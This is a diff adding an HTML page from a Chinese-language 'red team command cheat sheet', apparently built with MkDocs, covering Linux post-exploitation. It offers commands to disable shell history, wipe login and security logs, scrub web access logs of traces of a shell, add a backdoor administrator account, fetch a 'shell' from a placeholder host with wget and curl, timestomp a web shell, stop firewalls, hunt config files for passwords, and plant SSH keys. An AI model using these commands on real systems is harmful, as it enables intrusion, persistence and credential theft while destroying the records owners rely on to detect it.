@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!--
+    The page_title contains the title for a page as shown in the navigation.
+    Site name contains the name as defined in the mkdocs.yml
+  -->
+  <title>Linux 命令速查 - 红队命令速查</title>
+
+  <!-- Page description -->
+  
+
+  <!-- Redirect -->
+  
+
+  <!-- Page author -->
+  
+  <!--
+    Just add a favicon.ico image to the docs.
+  -->
+  <link rel="shortcut icon" href="../img/favicon.ico">
+
+  <link rel="stylesheet" href="../css/colors.css">
+  <link rel="stylesheet" href="../css/bundle.css">
+  <link rel="stylesheet" href="../css/theme.css">
+  <link media="print" onload="this.media='all'" rel="stylesheet" href="../css/atom-dark-one.min.css">
+  <!--
+    extra_ess contains paths to CSS files in the users
+    documentation directory or a list of CSS files defined in
+    their mkdocs.yml.
+
+    http://www.mkdocs.org/user-guide/configuration/#extra_css
+  -->
+  
+
+  
+  
+
+  <!--
+    Include Google Analytics tracking code.
+
+    http://www.mkdocs.org/user-guide/configuration/#google_analytics
+  -->
+  
+
+</head>
+
+<body>
+<input id="dark-mode" type="checkbox" />
+<!--
+  The JS has to be loaded here for maximum performance, right after the #dark-mode
+-->
+<script src="../js/theme.js"></script>
+<div class="app-body">
+  <!-- KPN STYLE Beginning -->
+  <div class="app-layout ">
+    <!-- Top Bar -->
+    <nav class="app-layout__top-bar top-bar">
+      <a class="top-bar__logo" href="https://forum.ywhack.com/command/">
+        <img alt="KPN Logo" src="../img/logo.svg" />
+      </a>
+      <div class="top-bar__title">红队命令速查</div>
+      <ul class="top-bar__menu">
+        <!--
+          Create a search form that sends the user to the search.html file - this is
+          the other file in the template which adds search to the theme. The only
+          requirement here is that there is a text input with the name 'q' and the
+          action and methods match below.
+        -->
+          <li class="top-bar__item">
+
+            <span role="search" id="search-input-wrapper">
+              <form action="../search.html" method="get">
+                <input type="text" class="input" id="search-input" name="q" placeholder="Search..." />
+              </form>
+            </span >
+          </li>
+        <!--
+          Versioning support
+        -->
+        
+        <!--
+          Support repo URL
+        -->
+        <li class="top-bar__item">
+          
+        </li>
+
+        <li class="top-bar__item">
+            <label class="top-bar__link" id="label-dark-mode" for="dark-mode" title="Dark mode">
+              <svg alt="dark mode" width="24" height="24">
+                <image xlink:href="../img/ui-bulb.svg" width="24" height="24"/>
+            </svg>
+            </label>
+        </li>
+        <li class="top-bar__item top-bar__item--trigger"></li>
+
+        <!-- <li class="top-bar__item">
+
+          <a class="top-bar__link top-bar__link--active">Home</a>
+        </li>
+        <li class="top-bar__item"><a class="top-bar__link">Information</a></li>
+        <li class="top-bar__item">
+          <a class="top-bar__link top-bar__link--collapsed">Getting Started</a>
+
+        </li>
+        <li class="top-bar__item top-bar__item--trigger">Menu</li> -->
+      </ul>
+    </nav>
+
+    <!--
+      Create the navigation for the documentation.
+
+      Because we don't know how many levels deep the navigation is, it needs to
+      be included in it's own file so it can be recursive. Otherwise the theme
+      can also only support a specific number of levels.
+
+      See the nav.html file for more details about how this works.
+    -->
+    <nav class="app-layout__side-bar side-bar">
+      <div class="side-bar__action-bar">
+        <a class="side-bar__link" href="/">红队命令速查</a>
+        <!--
+          Versioning support
+        -->
+        
+        <button class="side-bar__close"></button>
+      </div>
+      <ul class="side-bar__menu">
+        
+          <!--
+
+-->
+
+<li>
+  <a href=".." class="side-bar__link ">
+    介绍
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+<li>
+  <a href="./" class="side-bar__link side-bar__link--active">
+    Linux 命令速查
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+<li>
+  <a href="../Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/" class="side-bar__link ">
+    Windows 命令速查
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+  <li>
+    <span class="side-bar__link side-bar__link--expanded">
+      工具使用命令速查
+    </span>
+    <ul class="side-bar__sub-menu side-bar__sub-menu--visible">
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/" class="side-bar__link ">
+    mimikatz
+  </a>
+</li>
+
+
+        
+    </ul>
+  </li>
+
+
+        
+          <!--
+
+-->
+
+  <li>
+    <span class="side-bar__link side-bar__link--expanded">
+      数据库命令速查
+    </span>
+    <ul class="side-bar__sub-menu side-bar__sub-menu--visible">
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/" class="side-bar__link ">
+    oracle
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/" class="side-bar__link ">
+    mysql
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/" class="side-bar__link ">
+    postgresql
+  </a>
+</li>
+
+
+        
+    </ul>
+  </li>
+
+
+        
+      </ul>
+    </nav>
+
+    <!-- MAIN BLOCK -->
+    <main class="app-layout__main main">
+      <div class="app-layout__title-bar title-bar">
+        <div class="title-bar__title" style="font-size: 12px;">Linux 命令速查</div>
+      </div>
+      
+      <div class="sidebar--secondary hidden-s hidden-xs">
+        <h4>Table of contents</h4>
+        <ul>
+        
+          
+            
+                <li><a class="a" href="#_1">本次不记录命令</a></li>
+                
+            
+                <li><a class="a" href="#_2">常用日志清理</a></li>
+                
+            
+                <li><a class="a" href="#web">Web 日志清理</a></li>
+                
+            
+                <li><a class="a" href="#_3">设置终端代理</a></li>
+                
+            
+                <li><a class="a" href="#_4">查看用户登录记录</a></li>
+                
+            
+                <li><a class="a" href="#root">root 权限创建管理员用户</a></li>
+                
+            
+                <li><a class="a" href="#curlwget">cURL/wget 下载文件</a></li>
+                
+            
+                <li><a class="a" href="#_5">文件时间修改</a></li>
+                
+            
+                <li><a class="a" href="#dns">查看 DNS 服务器</a></li>
+                
+            
+                <li><a class="a" href="#_6">停止防火墙</a></li>
+                
+            
+                <li><a class="a" href="#_7">搜索敏感信息</a></li>
+                
+            
+                <li><a class="a" href="#echo">echo 写文件</a></li>
+                
+            
+                <li><a class="a" href="#ssh">写入 ssh 公钥：</a></li>
+                
+            
+                <li><a class="a" href="#_8">压缩打包文件</a></li>
+                
+            
+                <li><a class="a" href="#_9">分割上传</a></li>
+                
+            
+          
+        
+        </ul>
+      </div>
+      
+      <div class="container content-block">
+        <div class="kpn-style">
+          <div class="card">
+            <div class="card__body">
+
+              
+              <h1 id="linux">Linux 命令速查</h1>
+<h2 id="_1">本次不记录命令</h2>
+<pre><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
+</code></pre>
+<h2 id="_2">常用日志清理</h2>
+<pre><code>echo &gt; /var/log/btmp;echo &gt; /var/log/wtmp;echo &gt; /var/log/lastlog;echo &gt; /var/log/utmp;echo &gt; /var/log/syslog;cat /dev/null &gt; /var/log/secure;cat /dev/null &gt; /var/log/message;echo ok
+</code></pre>
+<ul>
+<li>/var/log/btmp   记录所有登录失败信息，使用lastb命令查看</li>
+<li>/var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看</li>
+<li>/var/log/wtmp    记录所有用户的登录、注销信息，使用last命令查看</li>
+<li>/var/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看</li>
+<li>/var/log/secure   记录与安全相关的日志信息</li>
+<li>/var/log/message  记录系统启动后的信息和错误日志</li>
+</ul>
+<h2 id="web">Web 日志清理</h2>
+<pre><code>直接替换日志ip地址:
+sed -i 's/127.0.0.1/192.168.1.1/g' access.log
+
+清除部分相关日志:
+使用grep -v来把相关信息删除:
+cat /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log
+
+把修改过的日志覆盖到原日志文件:
+cat tmp.log &gt; /var/log/nginx/access.log
+</code></pre>
+<h2 id="_3">设置终端代理</h2>
+<pre><code>export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890
+</code></pre>
+<h2 id="_4">查看用户登录记录</h2>
+<pre><code>last
+</code></pre>
+<h2 id="root">root 权限创建管理员用户</h2>
+<pre><code>sudo useradd -m testt &amp;&amp; echo &quot;testt:admin@123&quot; | sudo chpasswd &amp;&amp; sudo usermod -aG wheel testt
+</code></pre>
+<h2 id="curlwget">cURL/wget 下载文件</h2>
+<pre><code>wget -P /tmp/ http://x.x.x.x:8080/shell
+curl -o /tmp/xxx http://x.x.x.x:8080/shell
+</code></pre>
+<h2 id="_5">文件时间修改</h2>
+<blockquote>
+<p>修改 /www/wwwroot/shell.php 时间为 2024.05.16.24</p>
+</blockquote>
+<pre><code>touch -t 202405161200.24 /www/wwwroot/shell.php
+</code></pre>
+<h2 id="dns">查看 DNS 服务器</h2>
+<pre><code>cat /etc/resolv.conf
+</code></pre>
+<h2 id="_6">停止防火墙</h2>
+<pre><code>systemctl stop firewalld &amp;&amp; service iptables stop &amp;&amp; ufw disable
+</code></pre>
+<h2 id="_7">搜索敏感信息</h2>
+<pre><code>find / -regex &quot;.*\.properties\|.*\.conf\|.*\.config\|.*\.yaml\|.*\.sh|.*\.jsp|.*\.log|.*\.txt|.*\.xml&quot; | xargs grep -E &quot;=jdbc:|pass=|passwd=|aliyun|password&quot;
+</code></pre>
+<h2 id="echo">echo 写文件</h2>
+<pre><code>//直接 echo 写入：
+echo xxx &gt; /www/xxx.jsp
+
+//base64 写入：
+echo eHh4ZGFzMQ== | base64 -d &gt; /www/xxx.jsp
+
+//追加
+echo xxx &gt;&gt; /www/xxx.jsp
+</code></pre>
+<h2 id="ssh">写入 ssh 公钥：</h2>
+<pre><code>echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEazRVTjhFUTFXOFBWMQ== | base64 -d &gt; authorized_keys
+</code></pre>
+<pre><code>//使用  printf 在末尾处插入，如需换行可添加\n
+//参考https://baijiahao.baidu.com/s?id=1727019063436737118&amp;wfr=spider&amp;for=pc
+
+printf &quot;ssh-rsa xxx&quot; &gt;&gt; /root/.ssh/authorized_keys
+</code></pre>
+<h2 id="_8">压缩打包文件</h2>
+<pre><code>//将 /home/mail /home/web 两个目录打包至 /tmp 目录下命名为web.tar.gz
+tar czvf /tmp/web.tar.gz /home/mail /home/web
+
+//zip
+zip -r /tmp/web.zip /home/mail /home/web
+
+//可使用 -x 排除，如:
+zip -r /tmp/web.zip /home/mail /home/web -x /home/mail/test.txt -x /home/web/log/*
+</code></pre>
+<h2 id="_9">分割上传</h2>
+<pre><code>split -n 3 fscan  //分割为 3 个文件
+split -b 500k fscan  //以 500 K 大小分割 fscan
+
+Windows 合并：
+copy /b xaa+xab fscan
+type xaa xab &gt; fscan
+
+Linux 合并：
+cat xaa xab &gt; fscan
+</code></pre>
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+      <div class="footer__body">
+        
+        <div class="row">
+          <div class="col col--s-4 col--m-3 col--l-2">
+          </div>
+          <div class="col col--s-4 col--m space-between">
+            
+              <a class="footer__link padding-top-0 navigation-prev"
+                href=".."
+                title="介绍">
+                &#8592; Previous Page
+              </a>
+            
+            
+            
+              <a class="footer__link padding-top-0 navigation-next"
+                href="../Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/"
+                title="Windows 命令速查"/>
+                Next Page &#8594;
+              </a>
+            
+          </div>
+          <div class="col col--s-4 col--m-3 ">
+          </div>
+        </div>
+        
+      </div>
+    </footer>
+  </div>
+
+
+  <!--
+  MkDocs version      : 1.5.3
+  Docs Build Date UTC : 2024-07-09 15:06:35.699485+00:00
+  -->
+
+  <!--
+    To include static assets from our theme, just add
+    .. beforehand which will be the relative path to
+    the root of the documentation.
+  -->
+  <script src="../js/highlight.min.js"></script>
+  <script src="../js/languages/groovy.min.js"></script>
+  <script src="../js/languages/asciidoc.min.js"></script>
+  <script src="../js/languages/nix.min.js"></script>
+
+  <script>
+    hljs.highlightAll();
+  </script>
+  <script async src="../js/detail.js"></script>
+  <!--
+    extra_javascript contains paths to JavaScript files in the
+    users documentation directory or a list of JavaScript files
+    defined in their mkdocs.yml.
+
+    http://www.mkdocs.org/user-guide/configuration/#extra_javascript
+  -->
+  
+    <script src="../search/main.js"></script>
+  
+
+
+  <script>
+  function getMermaidTheme() {
+    if (document.getElementById("dark-mode").checked) {
+      return 'dark'
+    }
+    return 'forest'
+  }
+
+  function initMermaid() {
+    mermaid.initialize({
+      theme: getMermaidTheme(),
+      logLevel: 1,
+    });
+  }
+  var mermaidClass = document.getElementsByClassName('mermaid');
+  if (mermaidClass.length > 0) {
+
+    var mermaidScript = document.createElement('script');
+    mermaidScript.setAttribute("src", "../js/mermaid.min.js");
+    mermaidScript.setAttribute("async", "false");
+    mermaidScript.setAttribute("type", "text/javascript");
+    mermaidScript.onload = initMermaid;
+    document.body.appendChild(mermaidScript)
+
+  }
+  </script>
+
+</div>
+</body>
+</html>
